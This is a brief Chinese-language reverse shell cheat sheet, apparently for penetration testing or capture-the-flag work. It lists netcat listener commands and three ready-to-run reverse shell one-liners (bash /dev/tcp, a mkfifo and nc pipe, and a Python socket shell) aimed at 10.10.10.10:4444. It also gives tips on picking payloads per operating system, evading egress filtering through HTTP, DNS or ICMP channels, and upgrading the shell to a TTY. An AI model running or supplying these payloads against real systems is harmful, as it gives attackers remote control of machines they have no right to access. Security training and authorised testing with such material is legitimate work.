# 反弹 Shell

## 监听

```bash
nc -lvnp 4444
rlwrap nc -lvnp 4444
```

## 常用 payload

```bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.10.10 4444 > /tmp/f
```

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.10.10",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'
```

## 选择原则

- Linux 优先 Bash `/dev/tcp`。
- Windows 优先 PowerShell、`nc.exe` 或 MSF payload。
- 有出网限制时尝试 HTTP、HTTPS、DNS 或 ICMP 通道。
- 得到 shell 后先升级为交互式 TTY。